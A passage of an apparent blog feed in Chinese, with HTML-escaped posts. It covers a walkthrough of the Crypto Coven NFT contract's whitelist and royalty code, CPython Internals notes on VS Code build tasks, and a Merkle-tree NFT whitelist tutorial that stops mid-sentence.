class="punctuation">:</span> <span class="string">&quot;moon-necklace&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;silver&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fullName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;necklace_moon-necklace_silver&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>其中包含女巫的ID，名称，图片地址，属性等信息。</p><p>不得不说，如果 Amazon S3 出问题了，可能这些图片就没法显示了。</p><h3><span id="shi-yong-merkle-zheng-ming-shi-xian-bai-ming-dan-ji-zhi">使用 Merkle 证明实现白名单机制</span></h3><p>对于预售，项目方使用白名单方式进行，而对于白名单验证，合约中使用 Merkle 证明的方式进行验证。</p><p>在 mint 时，只需发送正确的 Merkle 证明来验证即可实现白名单功能，这个方法不仅效率高，而且省去了在合约中存储所有白名单地址造成的 Gas 消耗。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    modifier isValidMerkleProof(bytes32[] calldata merkleProof, bytes32 root) &#123;</span><br><span class="line">        require(</span><br><span class="line">            MerkleProof.verify(</span><br><span class="line">                merkleProof,</span><br><span class="line">                root,</span><br><span class="line">                keccak256(abi.encodePacked(msg.sender))</span><br><span class="line">            ),</span><br><span class="line">            &quot;Address does not exist in list&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    function mintCommunitySale(</span><br><span class="line">        uint8 numberOfTokens,</span><br><span class="line">        bytes32[] calldata merkleProof</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        nonReentrant</span><br><span class="line">        communitySaleActive</span><br><span class="line">        canMintWitches(numberOfTokens)</span><br><span class="line">        isCorrectPayment(COMMUNITY_SALE_PRICE, numberOfTokens)</span><br><span class="line">        isValidMerkleProof(merkleProof, communitySaleMerkleRoot)</span><br><span class="line">    &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claim(bytes32[] calldata merkleProof)</span><br><span class="line">        external</span><br><span class="line">        isValidMerkleProof(merkleProof, claimListMerkleRoot)</span><br><span class="line">        canGiftWitches(1)</span><br><span class="line">    &#123;</span><br><span class="line">// ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>详细细节可以参考我之前的一篇文章：</p><h3><span id="yu-xian-pi-zhun-opensea-he-yue">预先批准 Opensea 合约</span></h3><p>可以看到在 OpenSea 上列出这些 NFT 费用为 0 gas，因为合约预先批准了 OpenSea 合约以节省用户的 gas，同时合约还包括一个紧急功能来消除这种行为！</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    /**</span><br><span class="line">     * @dev Override isApprovedForAll to allowlist user&#x27;s OpenSea proxy accounts to enable gas-less listings.</span><br><span class="line">     */</span><br><span class="line">    function isApprovedForAll(address owner, address operator)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        // Get a reference to OpenSea&#x27;s proxy registry contract by instantiating</span><br><span class="line">        // the contract using the already existing address.</span><br><span class="line">        ProxyRegistry proxyRegistry = ProxyRegistry(</span><br><span class="line">            openSeaProxyRegistryAddress</span><br><span class="line">        );</span><br><span class="line">        if (</span><br><span class="line">            isOpenSeaProxyActive &amp;&amp;</span><br><span class="line">            address(proxyRegistry.proxies(owner)) == operator</span><br><span class="line">        ) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return super.isApprovedForAll(owner, operator);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// These contract definitions are used to create a reference to the OpenSea</span><br><span class="line">// ProxyRegistry contract by using the registry&#x27;s address (see isApprovedForAll).</span><br><span class="line">contract OwnableDelegateProxy &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ProxyRegistry &#123;</span><br><span class="line">    mapping(address =&gt; OwnableDelegateProxy) public proxies;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了防止 Opensea 关闭或者被入侵，合约可以通过 <code>setIsOpenSeaProxyActive</code> 方法关闭预先批准。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// function to disable gasless listings for security in case</span><br><span class="line">// opensea ever shuts down or is compromised</span><br><span class="line">function setIsOpenSeaProxyActive(bool _isOpenSeaProxyActive)</span><br><span class="line">    external</span><br><span class="line">    onlyOwner</span><br><span class="line">&#123;</span><br><span class="line">    isOpenSeaProxyActive = _isOpenSeaProxyActive;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="erc165">ERC165</span></h3><p>这是一种发布并能检测到一个智能合约实现了什么接口的标准，用于实现对合约实现的接口的查询。这个标准需要实现 <code>suppoetsInterface</code> 方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface ERC165 &#123;</span><br><span class="line">    /// @notice Query if a contract implements an interface</span><br><span class="line">    /// @param interfaceID The interface identifier, as specified in ERC-165</span><br><span class="line">    /// @dev Interface identification is specified in ERC-165. This function</span><br><span class="line">    ///  uses less than 30,000 gas.</span><br><span class="line">    /// @return `true` if the contract implements `interfaceID` and</span><br><span class="line">    ///  `interfaceID` is not 0xffffffff, `false` otherwise</span><br><span class="line">    function supportsInterface(bytes4 interfaceID) external view returns (bool);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密女巫实现复写这个方法是因为它额外实现了 EIP2981 这个标准，需要指出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function supportsInterface(bytes4 interfaceId)</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    virtual</span><br><span class="line">    override(ERC721, IERC165)</span><br><span class="line">    returns (bool)</span><br><span class="line">&#123;</span><br><span class="line">    return</span><br><span class="line">        interfaceId == type(IERC2981).interfaceId ||</span><br><span class="line">        super.supportsInterface(interfaceId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="eip2981-nft-ban-shui-biao-zhun">EIP2981：NFT 版税标准</span></h3><p>EIP-2981 实现了标准化的版税信息检索，可被任何类型的 NFT 市场接受。EIP-2981 支持所有市场检索特定 NFT 的版税支付信息，从而实现无论 NFT 在哪个市场出售或转售都可以实现准确的版税支付。</p><p>NFT 市场和个人可通过检索版税支付信息 <code>royaltyInfo()</code> 来实施该标准，它指定为特定的 NFT 销售价格向指定的单一地址支付特定比例的金额。对于特定的 <code>tokenId</code> 和 <code>salePrice</code>，在请求时需提供一个版税接收者的地址和要支付的预期版税金额（<em>百分比表示</em>）。</p><p>女巫合约规定了 5% 的版税，但是这个标准并不是强制性的，需要靠市场去实施此标准。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev See &#123;IERC165-royaltyInfo&#125;.</span><br><span class="line"> */</span><br><span class="line">function royaltyInfo(uint256 tokenId, uint256 salePrice)</span><br><span class="line">    external</span><br><span class="line">    view</span><br><span class="line">    override</span><br><span class="line">    returns (address receiver, uint256 royaltyAmount)</span><br><span class="line">&#123;</span><br><span class="line">    require(_exists(tokenId), &quot;Nonexistent token&quot;);</span><br><span class="line"></span><br><span class="line">    return (address(this), SafeMath.div(SafeMath.mul(salePrice, 5), 100));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不太确定此函数中的注释 <code>See &#123;IERC165-royaltyInfo&#125;.</code> 是否正确，需要确认。</p><h3><span id="qi-ta-xi-jie">其他细节</span></h3><ol><li><p>没有 <code>tokensOfOwner</code> 方法</p><p>可能是基于女巫NFT的具体场景与优化 Gas 做的权衡，查询 token 所有者的功能需要靠 Opensea 的 API 或者 The Graph 去实现。</p></li></ol><ol start="2"><li><p>在没有外部调用的函数中也加了 <code>nonReentrant</code></p></li><li><p><code>msg.sender</code> 可能是合约</p></li><li><p>对 <code>onlyOwner</code> 也加了 <code>nonReentrant</code>，避免可能的被利用。</p></li></ol><h3><span id="can-kao">参考</span></h3><ol><li><strong><a href="https://mp.weixin.qq.com/s/DVUYmHLJE75GJ2ATdtYhEw">为什么说 EIP-2981 的生效对于 NFT 创作者来说至关重要？</a></strong></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Crypto Coven 加密女巫 NFT 合约解读
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CPython Internals 笔记 ── 介绍、开发环境设置</title>
    <link href="https://qiwihui.com/qiwihui-blog-148/"/>
    <id>https://qiwihui.com/qiwihui-blog-148/</id>
    <published>2024-05-15T02:25:31.363Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="jie-shao">介绍</span></h1><p>这本书将涵盖 CPython 内部实现的主要概念，并学习如何：</p><ul><li>阅读和浏览源代码</li><li>从源代码编译 CPython</li><li>更改 Python 语法并将其编译到你的 CPython 版本中</li><li>导航并理解诸如列表、字典和生成器的概念的内部工作原理</li><li>掌握 CPython 的内存管理能力</li><li>使用并行和并发扩展你的 Python 代码</li><li>使用新功能修改核心类型</li><li>运行测试套件</li><li>分析和基准测试 Python 代码和运行时的性能</li><li>像专家一样调试 C 和 Python 代码</li><li>修改或升级 CPython 库的组件并将它们贡献给未来的版本</li></ul><span id="more"></span><h2><span id="zai-xian-zi-yuan">在线资源</span></h2><p><a href="https://realpython.com/cpython-internals/resources/">CPython Internals resources</a></p><h2><span id="dai-ma-xie-yi">代码协议</span></h2><p>遵循 <a href="https://creativecommons.org/publicdomain/zero/1.0/">Creative Commons Public Domain (CC0) License</a>。</p><blockquote><p>这书中的代码已经在 Windows 10、macOS 10.15 和 Linux 上使用 Python 3.9.0b1 进行了测试。</p></blockquote><h1><span id="she-zhi-kai-fa-huan-jing">设置开发环境</span></h1><p>CPython 源代码大约 65% 是 Python（测试是重要的部分）、24% C，其余是其他语言的混合。</p><h2><span id="she-zhi-visual-studio-code">设置 Visual Studio Code</span></h2><p>从 <a href="https://code.visualstudio.com/">code.visualstudio.com</a> 下载 Visual Studio Code，并在本地安装。</p><p>推荐的扩展：</p><ul><li><a href="https://github.com/Microsoft/vscode-cpptools">C/C++(ms-vscode.cpptools)</a> 提供对 C/C++ 的支持，包括 IntelliSense、调试和代码高亮。</li><li><a href="https://github.com/Microsoft/vscode-python">Python(ms-python.python)</a> 为编辑、调试和阅读 Python 代码提供丰富的 Python 支持。</li><li><a href="https://github.com/vscode-restructuredtext/vscode-restructuredtext">Restructured Text (lextudio.restructuredtext)</a>  为 reStructuredText（CPython 文档中使用的格式）提供丰富的支持。</li><li><a href="https://github.com/spmeesseman/vscode-taskexplorer">Task Explorer (spmeesseman.vscode-taskexplorer)</a> 在资源管理器选项卡内添加“任务资源管理器”面板，可以更容易启动 make 任务。</li></ul><h3><span id="pei-zhi-ren-wu-he-qi-dong-wen-jian">配置任务和启动文件</span></h3><p>VS Code 在工作区目录中创建一个文件夹 <code>.vscode</code>。 在此文件夹中，你可以创建：</p><ul><li><code>tasks.json</code> 用于执行项目命令的快捷方式</li><li><code>launch.json</code> 用于配置调试器</li><li>其他特定于插件的文件</li></ul><p>在 <code>.vscode</code> 目录中创建一个 <code>tasks.json</code> 文件，并添加以下内容：</p><p><code>cpython-book-samples/11/tasks.json</code>：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;windows&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PCBuild\build.bat&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;-p x64 -c Debug&quot;</span><span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;linux&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;make -j2 -s&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;osx&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;make -j2 -s&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>使用任务资源管理器插件，你将在 vscode 组中看到你配置的任务列表。</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CPython Internals 笔记 ── 介绍、开发环境设置
    
    </summary>
    
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
      <category term="读书笔记" scheme="https://qiwihui.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="CPythonInternals" scheme="https://qiwihui.com/tags/CPythonInternals/"/>
    
  </entry>
  
  <entry>
    <title>使用 Merkle 树做 NFT 白名单验证</title>
    <link href="https://qiwihui.com/qiwihui-blog-151/"/>
    <id>https://qiwihui.com/qiwihui-blog-151/</id>
    <published>2024-05-15T02:25:31.363Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>Merkle 树现在普遍用来做线上数据验证。这篇文章主要解释和实现使用 Merkle 树做 NFT 白名单验证。</p><p>使用 Merkle 树做 NFT 白名单验证，简单来说就是将所有的白名单钱包地址做为 Merkle 树的叶节点生成一棵 Merkle 树，在部署的NFT 合约中只存储 Merkle 树的 root hash，这样避免了在合约中存储所有白名单地址带来的高额 gas 费用。在 mint 时，前端生成钱包地址的 Merkle proof，调用合约进行验证即可。</p><span id="more"></span><p>一次验证过程前端和合约运行过程如图：</p><p><img src="https://user-images.githubusercontent.com/3297411/150952521-2c104057-33b9-488e-94d4-c5570767e61b.png" alt="Untitled"></p><p>图片来自 [3]</p><h3><span id="merkle-shu">Merkle 树</span></h3><p>详情请参见：<a href="https://en.wikipedia.org/wiki/Merkle_tree">https://en.wikipedia.org/wiki/Merkle_tree</a></p><p><img src="https://user-images.githubusercontent.com/3297411/150952561-e4186a0c-a437-4dfc-a037-7fc2965597c3.png" alt="Untitled 1"></p><p>图片来自 [1]</p><p>比如，以水果单词作为叶节点，生成 Merkle 树的结构如下：</p><p><img src="https://user-images.githubusercontent.com/3297411/150952596-213c31de-514e-48fe-8d2f-3b382e730bc5.png" alt="Untitled 2"></p><p>图片来自 [2]</p><h3><span id="he-yue-shi-xian">合约实现</span></h3><p>我们简单实现 Merkle 验证的过程，此合约包含以下功能：</p><ol><li>设置 Merkle 根哈希： <code>setSaleMerkleRoot</code></li><li>验证 Merkle proof： <code>isValidMerkleProof</code></li><li>mint 并记录是否已经mint： <code>mint</code></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/cryptography/MerkleProof.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Merkle is Ownable &#123;</span><br><span class="line">    bytes32 public saleMerkleRoot;</span><br><span class="line">    mapping(address =&gt; bool) public claimed;</span><br><span class="line"></span><br><span class="line">    function setSaleMerkleRoot(bytes32 merkleRoot) external onlyOwner &#123;</span><br><span class="line">        saleMerkleRoot = merkleRoot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier isValidMerkleProof(bytes32[] calldata merkleProof, bytes32 root) &#123;</span><br><span class="line">        require(</span><br><span class="line">            MerkleProof.verify(</span><br><span class="line">                merkleProof,</span><br><span class="line">                root,</span><br><span class="line">                keccak256(abi.encodePacked(msg.sender))</span><br><span class="line">            ),</span><br><span class="line">            &quot;Address does not exist in list&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(bytes32[] calldata merkleProof)</span><br><span class="line">        external</span><br><span class="line">        isValidMerkleProof(merkleProof, saleMerkleRoot)</span><br><span class="line">    &#123;</span><br><span class="line">        require(!claimed[msg.sender], &quot;Address already claimed&quot;);</span><br><span class="line">        claimed[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="merkle-proof-zheng-ming-sheng-cheng">Merkle proof 证明生成</span></h3><p>调用合约验证的 Merkle proof 需要在前端生成。生成过程需要用到 <code>merkletreejs</code>和 <code>keccak256</code> 两个库，前者用于创建 Merkle 树，后者用于生成哈希。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save merkletreejs keccak256</span><br></pre></td></tr></table></figure><p>第一步，生成白名单地址的 Merkle 树：</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">MerkleTree</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;merkletreejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> keccak256 = <span class="built_in">require</span>(<span class="string">&#x27;keccak256&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> whitelistAddresses = [</span><br><span class="line">    <span class="string">&#x27;0x169841AA3024cfa570024Eb7Dd6Bf5f774092088&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x0a290c8cE7C35c40F4F94070a9Ed592fC85c62B9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x43Be076d3Cd709a38D2f83Cd032297a194196517&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xC7FaB03eecA24CcaB940932559C5565a4cE9cFFb&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xE4336D25e9Ca0703b574a6fd1b342A4d0327bcfa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xeDcB8a28161f966C5863b8291E80dDFD1eB78491&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x77cbd0fa30F83a249da282e9fE90A86d7936FdE7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xc39F9406284CcAeB426D0039a3F6ADe14573BaFe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x16Beb6b55F145E4269279B82c040B7435f1088Ee&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x900b2909127Dff529f8b4DB3d83b957E6aE964c2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xeA2A799793cE3D2eC6BcD066563f385F25401e95&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> leafNodes = whitelistAddresses.<span class="title function_">map</span>(<span class="function"><span class="params">address</span> =&gt;</span> <span class="title function_">keccak256</span>(address));</span><br><span class="line"><span class="keyword">let</span> tree = <span class="keyword">new</span> <span class="title class_">MerkleTree</span>(leafNodes, keccak256, &#123; <span class="attr">sortPairs</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Tree: &#x27;</span>, tree.<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">// const root = tree.getRoot();</span></span><br><span class="line"><span class="comment">// console.log(&#x27;Root hash is: &#x27;, root.toString(&#x27;hex&#x27;));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Tree:  └─ c7ec7ffb250de2b95a1c690751b2826ec9d2999dd9f5c6f8816655b1590ca544</span></span><br><span class="line"><span class="comment">//    ├─ 25f76dfbdd295dd14932a7aae9350055e72e9e317cd389c62d525884cc0d0f17</span></span><br><span class="line"><span class="comment">//    │  ├─ 0613ec9d9455eaa91ffd480afaa50db8952ccf3cf1f04375f08f848dca194a86</span></span><br><span class="line"><span class="comment">//    │  │  ├─ e0c3820340c8c58fa46f9ff9c8da5037a8f544f839abe168b76aff3fa391e177</span></span><br><span class="line"><span class="comment">//    │  │  │  ├─ 1575cc1dded49f942913392f94716824d29b8fa45876b2db6295d16a606533a4</span></span><br><span class="line"><span class="comment">//    │  │  │  └─ 6abf3666623175adbce354196686c5e9853334b8eeb8324726a8ca89290c26d1</span></span><br><span class="line"><span class="comment">//    │  │  └─ 6c42c6099e51e28eef8f19f71765bb42c571d5c7177996f177606138f65c0c2b</span></span><br><span class="line"><span class="comment">//    │  │     ├─ 4d313ef5510345a10724e131139b4556d77adaa109ba87087a600ea00bf92d18</span></span><br><span class="line"><span class="comment">//    │  │     └─ 83260aa668bd8b075be8e34c6f6609ad5be3eee1470f7b30f46e85650097cb98</span></span><br><span class="line"><span class="comment">//    │  └─ b0d6f760008340e3f60414d84b305702faa6418f44f31de07b10e05bf369eb3b</span></span><br><span class="line"><span class="comment">//    │     ├─ f1e3a4717b4179aecf418fc3a0c92c728828ee399700d9bcb512c6424f86cb7b</span></span><br><span class="line"><span class="comment">//    │     │  ├─ e00eb5681327801ed923ce4913468e70f833de797cfbc3df1e68dd13000f1fa6</span></span><br><span class="line"><span class="comment">//    │     │  └─ d71c2d63734c3ca3c4257d118442c5796796234f77bb325759973b90e130dc62</span></span><br><span class="line"><span class="comment">//    │     └─ 07ff91a64cd06c27a059056430bddfdf2d54e8833c0ccaa4642b39ed3b22579f</span></span><br><span class="line"><span class="comment">//    │        ├─ 74b490baa6a881c8934d0aacc7fd778d1bac1e259f17856fccea372b6978bad6</span></span><br><span class="line"><span class="comment">//    │        └─ 3845f80821bbaa15e35bfe9ace50761f9adeebf25b8472fae6e4ff0db394b2da</span></span><br><span class="line"><span class="comment">//    └─ 4c880bf401add28c4e51270dfe16b28c3ca1b3d263ff7c5863fc8214b4046364</span></span><br><span class="line"><span class="comment">//       └─ 4c880bf401add28c4e51270dfe16b28c3ca1b3d263ff7c5863fc8214b4046364</span></span><br><span class="line"><span class="comment">//          ├─ 52a3b2fbc6bb6ee25b925ac9767246ceb24fd99c64a7dbc72847e6dc8dc52b81</span></span><br><span class="line"><span class="comment">//          │  ├─ a61d6c75021de68e08a03f83d25738ac77e5e5cce1a63b4d48c2c819254b4375</span></span><br><span class="line"><span class="comment">//          │  └─ 85c68207164ed77f53351eac1a14074cf5cd5b0fb1a664709adcd0ee4aa4ea8d</span></span><br><span class="line"><span class="comment">//          └─ 1689b05d03db07df6c1f227c6f2ad46646a3edf11684c8081b821abbaf45a6dc</span></span><br><span class="line"><span class="comment">//             ├─ 93b5a65af2ac0633f9f90c6e05c89c30e1d4aba0b6f98d2c2b9bda4118538d9f</span></span><br><span class="line"><span class="comment">//             └─ 159859f50ff6cca7ef1060dcbc1a8daf59820817ea262f3f6107b431024eb9c4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到根哈希值为 <code>0xc7ec7ffb250de2b95a1c690751b2826ec9d2999dd9f5c6f8816655b1590ca544</code> ，这个值在调用合约函数 <code>setSaleMerkleRoot</code> 时需要用到，会保存在合约中。生成的 Merkle 证明需要存储在页面中，也可以存在 IPFS 中，在使用时加载使用。</p><p>第二步，需要生成参与 mint 地址的 Merkle 证明，假设使用 <code>0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33</code> 地址进行 mint 操作：</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> leaf = <span class="title function_">keccak256</span>(<span class="string">&#x27;0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> proof = tree.<span class="title function_">getHexProof</span>(leaf);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Proof of 0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33: &#x27;</span>, proof);</span><br></pre></td></tr></table></figure><p>对应生成的证明为</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Proof of 0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33:  [</span><br><span class="line">    <span class="string">&#x27;0x1575cc1dded49f942913392f94716824d29b8fa45876b2db6295d16a606533a4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x6c42c6099e51e28eef8f19f71765bb42c571d5c7177996f177606138f65c0c2b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xb0d6f760008340e3f60414d84b305702faa6418f44f31de07b10e05bf369eb3b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x4c880bf401add28c4e51270dfe16b28c3ca1b3d263ff7c5863fc8214b4046364&#x27;</span></span><br><span class="line">  ]</span><br></pre></td></tr></table></figure><p>同时我们将生成一个假的证明：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// another proof, for example</span><br><span class="line"></span><br><span class="line">let anotherWhitelistAddresses = [</span><br><span class="line">    &#x27;0x169841AA3024cfa570024Eb7Dd6Bf5f774092088&#x27;,</span><br><span class="line">    &#x27;0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33&#x27;,</span><br><span class="line">    &#x27;0x0a290c8cE7C35c40F4F94070a9Ed592fC85c62B9&#x27;,</span><br><span class="line">    &#x27;0x43Be076d3Cd709a38D2f83Cd032297a194196517&#x27;,</span><br><span class="line">];</span><br><span class="line">let anotherLeafNodes = anotherWhitelistAddresses.map(address =&gt; keccak256(address));</span><br><span class="line">let badTree = new MerkleTree(anotherLeafNodes, keccak256, &#123; sortPairs: true &#125;);</span><br><span class="line"></span><br><span class="line">let badLeaf = keccak256(&#x27;0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33&#x27;);</span><br><span class="line">let badProof = badTree.getHexProof(badLeaf);</span><br><span class="line">console.log(&#x27;Bad proof of 0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33: &#x27;, badProof);</span><br><span class="line"></span><br><span class="line">// Bad proof of 0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33:  [</span><br><span class="line">//     &#x27;0x1575cc1dded49f942913392f94716824d29b8fa45876b2db6295d16a606533a4&#x27;,</span><br><span class="line">//     &#x27;0x6c42c6099e51e28eef8f19f71765bb42c571d5c7177996f177606138f65c0c2b&#x27;</span><br><span class="line">//   ]</span><br></pre></td></tr></table></figure><h3><span id="yan-zheng-guo-cheng">验证过程</span></h3><p>此过程将使用 Remix IDE 进行部署和测试：</p><ol><li><p>使用 Remix 将合约部署到以太坊测试网 <code>Rinkeby</code> 中，得到合约地址为： <code>0xb3E2409199855ea9676dc5CFc9DefFd4A1b93eFe</code> ；</p></li><li><p>调用 <code>setSaleMerkleRoot</code> 设置 Merkle 根哈希为 <code>0xc7ec7ffb250de2b95a1c690751b2826ec9d2999dd9f5c6f8816655b1590ca544</code> ；</p></li><li><p>调用 <code>mint</code> ，传入非法 Merkle 证明：<code>[&quot;0x1575cc1dded49f942913392f94716824d29b8fa45876b2db6295d16a606533a4&quot;,&quot;0x6c42c6099e51e28eef8f19f71765bb42c571d5c7177996f177606138f65c0c2b&quot;]</code> ，可以看到<a href="https://rinkeby.etherscan.io/tx/0xc21a4f27c80f1427b703da1bccdceb58528e4ba52ac0023430391f4cb9c7ac34">交易</a>失败，显示 <code>Fail with error 'Address does not exist in list</code> ；</p></li><li><p>验证 <code>0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33</code> 